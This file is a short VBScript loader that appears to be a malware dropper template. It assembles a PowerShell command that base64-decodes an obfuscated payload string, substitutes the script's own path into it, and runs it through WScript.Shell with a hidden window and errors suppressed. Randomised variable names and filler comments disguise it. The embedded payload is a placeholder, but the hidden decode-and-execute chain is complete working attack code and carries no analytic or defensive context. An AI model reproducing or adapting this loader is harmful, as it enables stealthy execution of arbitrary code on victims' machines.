On Error Resume Next

dim oqzutkeyc
oqzutkeyc = WScript.ScriptFullName

fcxugomjv = ("OBFUSCATED_PS_LOADER")
dim nzwqspvp

nzwqspvp = ("$wsyurssllcfe = '") & fcxugomjv & "'"
nzwqspvp = nzwqspvp & ";$baafscrcqglz = [system.Text.Encoding]::UTF8.GetString( "

'----------------------------------------------------------------------'''----------------------------------------------------------------------

nzwqspvp = nzwqspvp & "[system.Convert]::FromBase64String( ($wsyurssllcfe -replace 'NEW_CHAR','ORIGINAL_CHAR')  ) )"
'----------------------------------------------------------------------'''----------------------------------------------------------------------

nzwqspvp = nzwqspvp & ";$baafscrcqglz = ($baafscrcqglz -replace '%vkaskasklnjqwke%', '" & replace(oqzutkeyc,"\","$") & "');powershell $baafscrcqglz;"


set tkqmhmbxywl =  CreateObject("WScript.Shell")
'----------------------------------------------------------------------'''----------------------------------------------------------------------


tkqmhmbxywl.Run "powershell " & (nzwqspvp) , 0, false
'----------------------------------------------------------------------'''----------------------------------------------------------------------